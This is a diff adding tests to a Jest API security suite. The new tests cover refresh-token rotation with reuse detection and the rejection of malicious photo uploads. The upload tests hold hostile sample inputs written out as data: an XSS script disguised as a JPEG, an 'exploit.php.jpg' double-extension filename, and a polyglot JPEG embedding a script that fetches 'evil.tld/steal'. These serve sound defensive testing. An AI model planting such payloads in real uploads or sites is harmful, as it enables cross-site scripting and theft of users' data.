@@ -346,4 +346,118 @@ describe('API Security Test Suite (QA-002)', () => {
       expect(meRes.body.data.nameEn).toBe('Instant Role Upgrade Seller');
     });
   });
+
+  describe('9. Server-Side Refresh Token Rotation & Logout Revocation', () => {
+    it('revokes refresh token on logout and blocks token replay/reuse', async () => {
+      // Send and verify OTP to get a real session with stored refreshTokenHash
+      const sendRes = await request(app)
+        .post('/api/v1/auth/phone/send-otp')
+        .send({ phone: '9844455566' });
+      expect(sendRes.status).toBe(200);
+      const code = sendRes.body.data.code;
+
+      const verifyRes = await request(app)
+        .post('/api/v1/auth/phone/verify-otp')
+        .send({ phone: '9844455566', code });
+      expect(verifyRes.status).toBe(200);
+
+      const cookies1 = verifyRes.headers['set-cookie'];
+      const cookieArr1 = Array.isArray(cookies1) ? cookies1 : [cookies1];
+      const refreshCookie1 = cookieArr1.find((c: string) => c.startsWith('refreshToken='));
+      expect(refreshCookie1).toBeDefined();
+
+      // Rotate refresh token once -> succeeds and issues refreshToken #2
+      const refresh1 = await request(app)
+        .post('/api/v1/auth/refresh')
+        .set('Cookie', [refreshCookie1!]);
+      expect(refresh1.status).toBe(200);
+
+      const cookies2 = refresh1.headers['set-cookie'];
+      const cookieArr2 = Array.isArray(cookies2) ? cookies2 : [cookies2];
+      const refreshCookie2 = cookieArr2.find((c: string) => c.startsWith('refreshToken='));
+
+      // Replaying old rotated refreshToken #1 must be rejected with 401 (token reuse detection)
+      const replayRes = await request(app)
+        .post('/api/v1/auth/refresh')
+        .set('Cookie', [refreshCookie1!]);
+      expect(replayRes.status).toBe(401);
+
+      // Because token reuse invalidated the session family, even refreshToken #2 is now revoked!
+      const compromisedRes = await request(app)
+        .post('/api/v1/auth/refresh')
+        .set('Cookie', [refreshCookie2!]);
+      expect(compromisedRes.status).toBe(401);
+    });
+  });
+
+  describe('10. File Upload Magic-Byte, Double-Extension & Polyglot Script Protection', () => {
+    it('rejects a script renamed to .jpg with spoofed image/jpeg MIME type (magic-byte mismatch)', async () => {
+      const fakeJpegBuffer = Buffer.from('<html><script>alert("xss")</script></html>', 'utf8');
+
+      const res = await request(app)
+        .post('/api/v1/sellers/me/photos')
+        .set(sellerAAuth)
+        .attach('photo', fakeJpegBuffer, {
+          filename: 'innocent.jpg',
+          contentType: 'image/jpeg',
+        });
+
+      expect(res.status).toBe(422);
+      expect(res.body.message).toMatch(/signature mismatch/i);
+    });
+
+    it('rejects double-extension executable filenames like exploit.php.jpg', async () => {
+      const validJpegHeader = Buffer.from([
+        0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0xff, 0xd9,
+      ]);
+
+      const res = await request(app)
+        .post('/api/v1/sellers/me/photos')
+        .set(sellerAAuth)
+        .attach('photo', validJpegHeader, {
+          filename: 'exploit.php.jpg',
+          contentType: 'image/jpeg',
+        });
+
+      expect(res.status).toBe(422);
+      expect(res.body.message).toMatch(/invalid file extension/i);
+    });
+
+    it('rejects polyglot JPEG containing valid magic bytes followed by embedded <script> payload', async () => {
+      const jpegHeader = Buffer.from([
+        0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
+      ]);
+      const scriptPayload = Buffer.from('<script>fetch("https://evil.tld/steal")</script>', 'utf8');
+      const polyglotBuffer = Buffer.concat([jpegHeader, scriptPayload]);
+
+      const res = await request(app)
+        .post('/api/v1/sellers/me/photos')
+        .set(sellerAAuth)
+        .attach('photo', polyglotBuffer, {
+          filename: 'polyglot.jpg',
+          contentType: 'image/jpeg',
+        });
+
+      expect(res.status).toBe(422);
+      expect(res.body.message).toMatch(/embedded script/i);
+    });
+
+    it('accepts a genuine binary JPEG image with valid magic bytes and clean content', async () => {
+      const cleanJpeg = Buffer.from([
+        0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00,
+        0x48, 0x00, 0x48, 0x00, 0x00, 0xff, 0xd9,
+      ]);
+
+      const res = await request(app)
+        .post('/api/v1/sellers/me/photos')
+        .set(sellerAAuth)
+        .attach('photo', cleanJpeg, {
+          filename: 'shop-front.jpg',
+          contentType: 'image/jpeg',
+        });
+
+      expect(res.status).toBe(200);
+      expect(res.body.success).toBe(true);
+    });
+  });
 });
